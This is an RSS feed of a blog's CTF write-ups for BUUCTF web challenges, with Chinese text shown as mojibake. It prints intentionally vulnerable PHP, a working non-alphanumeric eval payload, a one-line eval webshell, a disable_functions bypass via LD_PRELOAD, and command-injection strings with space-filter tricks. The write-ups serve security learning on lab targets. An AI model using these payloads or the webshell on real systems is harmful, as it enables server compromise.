<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>BUUCTF_Web on</title><link>/tags/buuctf_web/</link><description>Recent content in BUUCTF_Web on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Mon, 18 Jan 2021 16:58:56 +0000</lastBuildDate><atom:link href="/tags/buuctf_web/index.xml" rel="self" type="application/rss+xml"/><item><title>BUUCTFå¯’å‡åˆ·é¢˜-Web</title><link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p>å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰
&lt;a href="https://buuoj.cn/challenges#">BUUCTF&lt;/a>
ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤
&lt;strong>é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨&lt;!-- raw HTML omitted -->Ctrl&lt;!-- raw HTML omitted -->+&lt;!-- raw HTML omitted -->F&lt;!-- raw HTML omitted -->æœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨&lt;/strong>&lt;/p>
&lt;h1 id="20210115">2021.01.15&lt;/h1>
&lt;h1 id="hctf-2018warmup">[HCTF 2018]WarmUp&lt;/h1>
&lt;p>è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png" alt="">&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
 highlight_file(__FILE__);
 class emmm
 {
 public static function checkFile(&amp;amp;$page)
 {
 $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
 if (! isset($page) || !is_string($page)) {
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }

 if (in_array($page, $whitelist)) {
 return true;
 }

 $_page = mb_substr(
 $page,
 0,
 mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }

 $_page = urldecode($page);
 $_page = mb_substr(
 $_page,
 0,
 mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }
 }

 if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
 ) {
 include $_REQUEST[&amp;#39;file&amp;#39;];
 exit;
 } else {
 echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
 } 
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php&lt;/p></description></item><item><title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019rce-me">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME&lt;/h1>
&lt;p>æºç ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
 $code=$_GET[&amp;#39;code&amp;#39;];
 if(strlen($code)&amp;gt;40){
 die(&amp;#34;This is too Long.&amp;#34;);
 }
 if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
 die(&amp;#34;NO.&amp;#34;);
 }
 @eval($code);
}
else{
 highlight_file(__FILE__);
}

// ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>åˆ†æä¸€æ³¢ï¼ŒGETè¯·æ±‚è·å¾—&lt;code>code&lt;/code>ï¼Œæƒ³è¦é€šè¿‡çš„è¯éœ€è¦ç»•è¿‡ä¸¤ä¸ªæ£€æµ‹ï¼š&lt;/p>
&lt;ol>
&lt;li>payloadé•¿åº¦å°äº40&lt;/li>
&lt;li>ä¸èƒ½åŒ…å«&lt;code>a-zã€A-Zã€0-9&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>å’Œä¹‹å‰åšè¿‡DMCTFé‡Œçš„ä¸€ä¸ªä¸èƒ½ç”¨æ•°å­—å’Œå­—æ¯æ„é€ payloadä¸€æ ·ï¼Œå½“æ—¶å‚è€ƒçš„åšå®¢æ˜¯phith0nå¸ˆå‚…çš„:&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell&lt;/a>ï¼Œè¿™æ¬¡æ‘¸åˆ°äº†ç›¸å…³æ–‡ç« ï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡&lt;/a>ã€‚&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>urlç¼–ç &lt;/code>+&lt;code>~&lt;/code>å–åæ„é€ ä¸å¯è§å­—ç¬¦ä¸²ï¼Œç„¶ååŠ ä¸Šphp7ç‰ˆæœ¬ä»¥åæ”¯æŒäº†ä½¿ç”¨ï¼š&lt;code>($a)()&lt;/code>è¿™æ ·çš„æ–¹æ³•åŠ¨æ€æ‰§è¡Œå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š&lt;code>assert(eval($_POST[â€˜aâ€™]))&lt;/code>&lt;/p>
&lt;p>å…ˆæ„é€ &lt;code>assert&lt;/code>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;assert&amp;#39;);

//ç»“æœï¼š%9E%8C%8C%9A%8D%8B
&lt;/code>&lt;/pre>&lt;p>å†æ„é€ &lt;code>eval($_POST['a'])&lt;/code>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);

//ç»“æœï¼š%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code>&lt;/pre>&lt;p>å®Œæ•´payloadï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code>&lt;/pre>&lt;p>ç½‘ç«™è·å¾—è¯·æ±‚ä»¥åä¼šè¿›è¡Œurlè§£ç ï¼Œç”±äºæ˜¯ä¸å¯è§å­—ç¬¦å¯ä»¥ç»•è¿‡é•¿åº¦å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹‹åæ‰§è¡Œä»£ç æ—¶ï¼Œå‰é¢çš„&lt;code>~&lt;/code>å–åå†è·å¾—çœŸæ­£çš„å‡½æ•°åã€‚&lt;/p>
&lt;p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿›åå°åœ¨æ ¹ç›®å½•æ‰¾åˆ°äº†flagã€readflagã€‚æ‰“å¼€flagå†…å®¹ä¸ºç©ºï¼Œåˆæ‰“å¼€readflagæ–‡ä»¶æ˜¯ä¸€å †ä¹±ç ï¼Œä½†æ˜¯çœ‹åˆ°äº†æ–‡ä»¶å¤´æ˜¯&lt;code>ELF&lt;/code>æ˜¯linuxçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å°±æ˜¯æ‰§è¡Œreadflagæ‰èƒ½è·å¾—flagï¼Œä½†æ˜¯åœ¨ç»ˆç«¯æ‰§è¡Œæ—¶å‡ºç°äº†ä¸€äº›é—®é¢˜ï¼šæ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œç»ˆç«¯éƒ½åªä¼šè¿”å›&lt;code>ret=127&lt;/code>ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png" alt="">&lt;/p>
&lt;p>æœç´¢äº†ä¸€æ³¢ï¼ŒåŸæ¥æ˜¯æ˜¯&lt;strong>disable_function&lt;/strong>æçš„é¬¼ï¼Œè¿™ä¸ªè¡¨å¯ä»¥åœ¨phpinfo()ä¸­æŸ¥çœ‹ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png" alt="">&lt;/p>
&lt;p>å› ä¸º&lt;code>system&lt;/code>ã€&lt;code>exec&lt;/code>ã€&lt;code>shell_exec&lt;/code>ç­‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«ç¦æ­¢äº†ï¼Œç›®å‰æˆ‘ç†è§£çš„webshellå°±æ˜¯é€šè¿‡è¿™äº›å‡½æ•°æ‰èƒ½åœ¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥ç»ˆç«¯åŸºæœ¬æ˜¯ä¸ªåºŸçš„ï¼Œæ‰€ä»¥å°±æ˜¯å¯»æ‰¾ç»•è¿‡&lt;strong>disable_function&lt;/strong>çš„æ–¹æ³•ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªæ–¹æ³•ï¼š&lt;/p>
&lt;p>&lt;strong>åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>phpçš„mailå‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šé»˜è®¤è°ƒç”¨ç³»ç»Ÿç¨‹åº/usr/sbin/sendmailï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒsendmailç¨‹åºï¼Œå†ç”¨mailå‡½æ•°æ¥è§¦å‘å°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®çš„&lt;/p>
&lt;p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸‹ä¸€ä¸ªæœ‰è¶£çš„ç¯å¢ƒå˜é‡ï¼šâ€œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>æ­£å¥½èšå‰‘çš„æ’ä»¶ä¸­å°±æœ‰ä¸€ä¸ªåä¸ºï¼š&lt;a href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions&lt;/a>çš„æ’ä»¶ï¼Œå¯ä»¥é€‰æ‹©åœ¨æ’ä»¶å¸‚åœºå®‰è£…æˆ–æ˜¯æ‰‹åŠ¨å®‰è£…ï¼ˆgithubæœ‰æ­¥éª¤ï¼‰ã€‚å®‰è£…ä»¥åå³é”®shellé€‰æ‹©åŠ è½½æ’ä»¶ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png" alt="">&lt;/p>
&lt;p>æ’ä»¶çš„å·¥ä½œåŸç†æ˜¯è‡ªåŠ¨ä¸Šä¼ å‡ ä¸ªç»•è¿‡çš„æ–‡ä»¶ï¼Œç„¶åå†ç”¨èšå‰‘è¿æ¥ä¸Šä¼ çš„æ–‡ä»¶å³å¯å®ç°ç»•è¿‡ï¼Œä½†æ˜¯ä¸€å¼€å§‹çš„&lt;code>/var/www/html&lt;/code>ç›®å½•æ˜¯æ²¡æœ‰ä¸Šä¼ æƒé™çš„ï¼Œæˆ‘å³é”®ä»¥åå‘ç°èƒ½ä¿®æ”¹æƒé™ï¼Œæ”¹æˆ0777ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png" alt="">&lt;/p>
&lt;blockquote>
&lt;p>åœ¨è¿™é‡Œæˆ‘è¿˜é‡åˆ°äº†é—®é¢˜ï¼Œä½¿ç”¨åŸæ¥çš„shellæ‰§è¡Œæ’ä»¶åŠŸèƒ½ä»¥åï¼Œç»ˆç«¯è¿˜æ˜¯æ²¡æœ‰æƒé™ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†è‡ªå·±åˆä¸Šä¼ äº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç”¨è¿™ä¸ªæ–°çš„ä¸€å¥è¯æœ¨é©¬æ‰§è¡Œæ’ä»¶æ‰æˆåŠŸï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œå¦‚æœæœ‰å¸ˆå‚…çŸ¥é“åŸå› æ±‚å‘ŠçŸ¥ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬233.phpï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code>&lt;/pre>&lt;p>å†ç”¨ä¸€å¥è¯æœ¨é©¬çš„shellæ‰§è¡Œæ’ä»¶ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png" alt="">&lt;/p>
&lt;p>è¿›å…¥shellï¼Œç›®å½•ä¸‹é¢å¤šäº†ä¸€ä¸ªåä¸º**.antproxy.php**çš„æ–‡ä»¶ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png" alt="">&lt;/p>
&lt;p>å†ä½¿ç”¨èšå‰‘è¿æ¥**.antproxy.php**ï¼Œå¯†ç æ˜¯è¿è¡Œæ’ä»¶çš„é‚£ä¸ªshellçš„å¯†ç ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å¼€å¼€å¿ƒå¿ƒçš„å»æ ¹ç›®å½•ä¸‹æ‰§è¡Œreadflagè·å¾—flagè¾£ã€‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png" alt="">&lt;/p>
&lt;p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p></description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping&lt;/h1>
&lt;p>é¢˜ç›®é“¾æ¥ï¼šhttps://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p>
&lt;p>å’ŒDMCTFåšçš„é‚£é“&lt;strong>pingpingping&lt;/strong>ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨ç®¡é“ç¬¦æ„é€ payloadï¼Œå…ˆä½¿ç”¨ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=127.0.0.1|ls
&lt;/code>&lt;/pre>&lt;p>ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼š&lt;code>flag.php&lt;/code>ã€&lt;code>index.php&lt;/code>ã€‚é¦–å…ˆè¯•å‡ºæ¥äº†ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ä»¥ä¸‹ç»•è¿‡ç©ºæ ¼ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>$IFS
${IFS}
$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ
&amp;lt; 
&amp;lt;&amp;gt; 
{cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½
%20 
%09 
&lt;/code>&lt;/pre>&lt;p>åœ¨linuxä¸‹åå•å¼•å·é‡Œé¢çš„æŒ‡ä»¤ä¼šè¢«æ‰§è¡Œ &lt;strong>`ls`&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>ä¼šè¾“å‡ºè¯¥ç›®å½•ä¸‹æ‰€æœ‰å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹&lt;strong>index.php&lt;/strong>çš„éƒ¨åˆ†æºç æœ‰å“ªäº›è¿‡æ»¤ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#a6e22e">ip&lt;/span>&lt;span style="color:#f92672">=|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your symbol!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/ /&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your space!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bash/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your bash!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your flag!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">shell_exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ping -c 4 &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$ip);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print_r&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€äº›åŸºæœ¬çš„ç¬¦å·ã€ç©ºæ ¼ã€bashã€ä»»ä½•å½¢å¼çš„flagå­—çœ¼éƒ½è¢«è¿‡æ»¤äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ‰¾è®¿é—®&lt;strong>flag.php&lt;/strong>ã€‚åœ¨ç½‘ä¸Šçœ‹äº†å¥½å¤šçš„é¢˜è§£ï¼Œç”¨äº†å¥½å¤šæ–¹æ³•ï¼Œä½†æ˜¯ç½‘é¡µè¾“å‡ºéƒ½ä¸ºç©ºï¼ŒåŸæ¥ä»¥ä¸ºå’Œå…¶ä»–é¢˜ç›®ä¸€æ ·ä½¿ç”¨&lt;strong>readflag&lt;/strong>çš„ELFæ‰§è¡Œæ–‡ä»¶è®¿é—®ï¼Œä½†æ˜¯è¿˜æ²¡æˆåŠŸã€‚å…¶å®æ‰§è¡Œï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>è¿™ä¸ªpayloadçš„æ—¶å€™æ–‡ä»¶éƒ½å·²ç»è¾“å‡ºäº†ï¼Œæˆ‘æœ€ååœ¨ç½‘é¡µæºç æ‰¾åˆ°äº†ï¼ŒåŸæ¥æ˜¯è¢«æ³¨é‡Šäº†&lt;!-- raw HTML omitted -->æˆ‘æ˜¯å‚»é€¼&lt;!-- raw HTML omitted -->ã€‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p></description></item></channel></rss>